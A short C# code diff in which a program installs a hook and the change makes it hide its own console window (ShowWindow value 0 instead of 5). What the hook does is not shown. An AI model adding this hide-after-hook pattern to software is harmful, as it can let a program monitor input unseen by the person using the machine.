@@ -30,7 +30,7 @@ namespace nEShit
                 }
                 Hook.SetHook();
                 var handle = Pinvoke.GetConsoleWindow();
-                Pinvoke.ShowWindow(handle, 5);
+                Pinvoke.ShowWindow(handle, 0);
 
             }
 
